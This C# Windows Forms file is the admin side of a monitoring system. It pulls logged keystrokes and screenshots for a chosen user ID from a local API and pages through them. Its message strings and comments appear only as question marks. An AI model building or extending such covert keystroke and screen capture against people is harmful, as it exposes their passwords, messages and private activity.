using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Net.Http;
using System.Net.Http.Json;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Linq;

namespace AdminForm
{
    public partial class Form1 : Form
    {
        private int _currentScreenshotIndex = 0;
        private List<string> _screenshotPaths = new List<string>();

        public Form1()
        {
            InitializeComponent();
        }

        private async void LoadKeyPresses_Click(object sender, EventArgs e)
        {
            if (!int.TryParse(userIdTextBox.Text, out int userId))
            {
                MessageBox.Show("??????? ?????????? ID ???????????.");
                return;
            }

            using (HttpClient client = new HttpClient())
            {
                try
                {
                    var response = await client.GetAsync($"http://localhost:5283/api/get-keypresses?userId={userId}");
                    if (response.IsSuccessStatusCode)
                    {
                        var keyPresses = await response.Content.ReadFromJsonAsync<List<KeyPress>>();
                        keyPressListBox.Items.Clear();

                        foreach (var keyPress in keyPresses)
                        {
                            keyPressListBox.Items.Add($"{keyPress.Timestamp}: {keyPress.KeyPressed}");
                        }
                    }
                    else
                    {
                        MessageBox.Show($"???????: {response.ReasonPhrase}");
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show($"??????? ????????????: {ex.Message}");
                }
            }
        }

        private async void LoadScreenshots_Click(object sender, EventArgs e)
        {
            if (!int.TryParse(userIdTextBox.Text, out int userId))
            {
                MessageBox.Show("??????? ?????????? ID ???????????.");
                return;
            }

            using (HttpClient client = new HttpClient())
            {
                try
                {
                    var response = await client.GetAsync($"http://localhost:5283/api/get-screenshots?userId={userId}");
                    if (response.IsSuccessStatusCode)
                    {
                        var screenshots = await response.Content.ReadFromJsonAsync<List<ScreenshotData>>();
                        _screenshotPaths = screenshots.Select(s => s.FileUrl).ToList();
                        _currentScreenshotIndex = 0;

                        if (_screenshotPaths.Count > 0)
                        {
                            await ShowScreenshotAsync(_currentScreenshotIndex);
                        }
                        else
                        {
                            MessageBox.Show("????????? ????????.");
                        }
                    }
                    else
                    {
                        MessageBox.Show($"???????: {response.ReasonPhrase}");
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show($"??????? ????????????: {ex.Message}");
                }
            }
        }

        private async Task ShowScreenshotAsync(int index)
        {
            if (_screenshotPaths == null || _screenshotPaths.Count == 0)
            {
                MessageBox.Show("????????? ???????? ??? ?????????.");
                return;
            }

            try
            {
                string screenshotUrl = _screenshotPaths[index]; // ?????????? URL ???????? ? ???????

                using (HttpClient client = new HttpClient())
                {
                    using (var responseStream = await client.GetStreamAsync(screenshotUrl))
                    {
                        using (var imageStream = new MemoryStream())
                        {
                            await responseStream.CopyToAsync(imageStream);
                            var originalImage = Image.FromStream(imageStream);

                            var resizedImage = ResizeImage(originalImage, screenshotPictureBox.Width, screenshotPictureBox.Height);

                            screenshotPictureBox.Image = resizedImage;
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"??????? ??? ??? ???????????? ?????????: {ex.Message}");
            }
        }

        private Image ResizeImage(Image image, int width, int height)
        {
            var destRect = new Rectangle(0, 0, width, height);
            var destImage = new Bitmap(width, height);

            destImage.SetResolution(image.HorizontalResolution, image.VerticalResolution);

            using (var graphics = Graphics.FromImage(destImage))
            {
                graphics.CompositingMode = System.Drawing.Drawing2D.CompositingMode.SourceCopy;
                graphics.CompositingQuality = System.Drawing.Drawing2D.CompositingQuality.HighQuality;
                graphics.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.HighQualityBicubic;
                graphics.SmoothingMode = System.Drawing.Drawing2D.SmoothingMode.HighQuality;
                graphics.PixelOffsetMode = System.Drawing.Drawing2D.PixelOffsetMode.HighQuality;

                graphics.DrawImage(image, destRect, 0, 0, image.Width, image.Height, GraphicsUnit.Pixel);
            }

            return destImage;
        }

        public class KeyPress
        {
            public DateTime Timestamp { get; set; }
            public string KeyPressed { get; set; }
        }

        public class ScreenshotData
        {
            public DateTime Timestamp { get; set; }
            public string FileUrl { get; set; } // URL ?? ????? ?? ???????
        }

        private async void NextScreenshot_Click(object sender, EventArgs e)
        {
            if (_screenshotPaths.Count == 0)
            {
                MessageBox.Show("????????? ????????.");
                return;
            }

            _currentScreenshotIndex = (_currentScreenshotIndex + 1) % _screenshotPaths.Count;
            await ShowScreenshotAsync(_currentScreenshotIndex);
        }

        private async void PreviousScreenshot_Click(object sender, EventArgs e)
        {
            if (_screenshotPaths.Count == 0)
            {
                MessageBox.Show("????????? ????????.");
                return;
            }

            _currentScreenshotIndex = (_currentScreenshotIndex - 1 + _screenshotPaths.Count) % _screenshotPaths.Count;
            await ShowScreenshotAsync(_currentScreenshotIndex);
        }

        private async void Next10Screenshots_Click(object sender, EventArgs e)
        {
            if (_screenshotPaths.Count == 0)
            {
                MessageBox.Show("????????? ????????.");
                return;
            }

            _currentScreenshotIndex = (_currentScreenshotIndex + 10) % _screenshotPaths.Count;
            await ShowScreenshotAsync(_currentScreenshotIndex);
        }

        private async void Previous10Screenshots_Click(object sender, EventArgs e)
        {
            if (_screenshotPaths.Count == 0)
            {
                MessageBox.Show("????????? ????????.");
                return;
            }

            _currentScreenshotIndex = (_currentScreenshotIndex - 10 + _screenshotPaths.Count) % _screenshotPaths.Count;
            await ShowScreenshotAsync(_currentScreenshotIndex);
        }

        private async void Next100Screenshots_Click(object sender, EventArgs e)
        {
            if (_screenshotPaths.Count == 0)
            {
                MessageBox.Show("????????? ????????.");
                return;
            }

            _currentScreenshotIndex = (_currentScreenshotIndex + 100) % _screenshotPaths.Count;
            await ShowScreenshotAsync(_currentScreenshotIndex);
        }

        private async void Previous100Screenshots_Click(object sender, EventArgs e)
        {
            if (_screenshotPaths.Count == 0)
            {
                MessageBox.Show("????????? ????????.");
                return;
            }

            _currentScreenshotIndex = (_currentScreenshotIndex - 100 + _screenshotPaths.Count) % _screenshotPaths.Count;
            await ShowScreenshotAsync(_currentScreenshotIndex);
        }
    }
}
